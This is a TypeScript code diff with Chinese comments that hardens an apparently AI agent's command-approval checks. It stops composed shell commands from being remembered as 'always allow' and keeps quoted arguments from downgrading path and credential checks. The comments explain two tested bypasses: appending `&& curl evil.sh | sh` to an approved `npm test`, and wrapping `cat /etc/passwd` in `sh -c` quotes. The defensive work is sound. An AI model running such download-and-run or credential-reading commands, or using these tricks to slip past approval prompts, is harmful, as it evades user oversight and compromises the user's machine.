@@ -251,11 +251,108 @@ function tokenize(command: string): string[] {
   return out;
 }
 
+/**
+ * shell 里能把「一条命令」变成「好几条命令」的符号。
+ * 单独列出来是因为它们决定的不是风险等级，而是**这条批准能不能被记住**。
+ */
+const COMPOSERS: { ch: string; why: string }[] = [
+  { ch: '&', why: '&（&& / 后台执行）' },
+  { ch: '|', why: '|（管道 / ||）' },
+  { ch: ';', why: ';（顺序执行）' },
+  { ch: '\n', why: '换行（多条命令）' },
+  { ch: '\r', why: '换行（多条命令）' },
+  { ch: '>', why: '>（输出重定向）' },
+  { ch: '<', why: '<（输入重定向）' },
+  { ch: '(', why: '(（子 shell）' },
+  { ch: '`', why: '反引号（命令替换）' },
+];
+
+/**
+ * 这条命令里有没有**未被引号保护的** shell 组合符？有就返回它的说明，没有返回 null。
+ *
+ * 为什么需要它（这是"始终允许"记忆上的一个真窟窿，实测存在）：
+ * 记忆键取的是首个字符串参数的**前两段**（`engine/approval.ts`），于是
+ * `npm test` 和 `npm test && curl evil.sh | sh` 算同一个键 `run_command:npm test`。
+ * 而后者既不命中危险模式（管道下载执行原先没在名单里），也不碰任何工作区外的路径，
+ * 所以它稳稳停在 `confirm`——而 `confirm` 恰好是唯一可以记忆的等级。
+ * 结果：对 `npm test` 点过一次「以后同类不再问」，就等于把 shell 交出去了。
+ *
+ * 修法不是把键做得更粗（那会让 `npm test` 连带覆盖 `npm install`，更糟），
+ * 而是让**组合命令根本不进记忆**：键只负责给"同一件事"归类，
+ * "这到底是不是同一件事"由这里判断。想省确认次数就写单条命令。
+ *
+ * 引号语义按 shell 来：单引号里什么都不展开，所以整段忽略；
+ * 双引号里 `` ` `` 和 `$()` 仍然会执行命令，所以照样算。
+ */
+export function composedCommand(command: string): string | null {
+  let quote: '"' | "'" | null = null;
+  let escaped = false;
+  let prev = '';
+  for (const ch of command) {
+    if (escaped) {
+      escaped = false;
+      prev = ch;
+      continue;
+    }
+    if (ch === '\\') {
+      escaped = true;
+      continue;
+    }
+    if (quote === "'") {
+      if (ch === "'") quote = null;
+      prev = ch;
+      continue;
+    }
+    if (quote === '"') {
+      if (ch === '"') quote = null;
+      else if (ch === '`') return '反引号（命令替换）';
+      else if (ch === '(' && prev === '$') return '$(（命令替换）';
+      prev = ch;
+      continue;
+    }
+    if (ch === '"' || ch === "'") {
+      quote = ch;
+      prev = ch;
+      continue;
+    }
+    if (ch === '(' && prev === '$') return '$(（命令替换）';
+    const hit = COMPOSERS.find((c) => c.ch === ch);
+    if (hit) return hit.why;
+    prev = ch;
+  }
+  return null;
+}
+
+/**
+ * 判定用的词表：`tokenize` 的结果，**再把带空白的词按空白切一遍并一并收进来**。
+ *
+ * 为什么要多这一步（实测的一个降级漏洞）：引号段在 `tokenize` 里是**一个**词，于是
+ * `sh -c "cat /etc/passwd"` 切出来的是 `cat /etc/passwd` 这一整个词——它含 `/`，
+ * `looksLikePath` 认它是路径，`resolve` 到工作区里变成 `<工作区>/cat /etc/passwd`，
+ * 判成 `inside`，不升级，稳稳停在 `confirm`。而**不加引号**的 `cat /etc/passwd`
+ * 切出 `/etc/passwd`，判 `outside` → `dangerous`。同一件事，加个引号就降一档。
+ *
+ * 原词也保留：`cat "my notes.txt"` 里带空格的文件名必须还能当成一个路径判。
+ *
+ * 取舍说明白：这样 `git commit -m "fix /etc/hosts parsing"` 会因为提到了工作区外的路径
+ * 而升到 `dangerous`——多问一次。方向是故意选的：**误升级的代价是多点一次确认，
+ * 漏升级的代价是等级和命令实际能干的事对不上**，后者才是这套判定要防的东西。
+ */
+export function commandTokens(command: string): string[] {
+  const out: string[] = [];
+  for (const t of tokenize(command)) {
+    out.push(t);
+    if (!/\s/.test(t)) continue;
+    for (const piece of t.split(/\s+/)) if (piece) out.push(piece);
+  }
+  return out;
+}
+
 /** 抽出命令里所有值得判定的本地路径，`~` 已展开 */
 export function commandPaths(command: string): string[] {
   const home = os.homedir();
   const out: string[] = [];
-  for (const t of tokenize(command)) {
+  for (const t of commandTokens(command)) {
     if (!looksLikePath(t)) continue;
     out.push(t === '~' || t.startsWith('~/') ? path.join(home, t.slice(1)) : t);
   }
@@ -298,7 +395,7 @@ export function classifyCommandZone(workspace: string, command: string): Command
 
   // 第一轮：所有词的**字面**都比一遍凭证名单。这样 `$HOME/.ssh/id_rsa`、
   // `"$PWD/../.ssh/id_rsa"` 这些解析不了的写法也拦得住
-  for (const t of tokenize(command)) {
+  for (const t of commandTokens(command)) {
     if (t.startsWith('-') || SCHEME.test(t)) continue;
     const literal = t.replace(/\\/g, '/');
     if (isSecret(literal)) return { kind: 'secret', path: t, real: t, matchedBy: 'literal' };
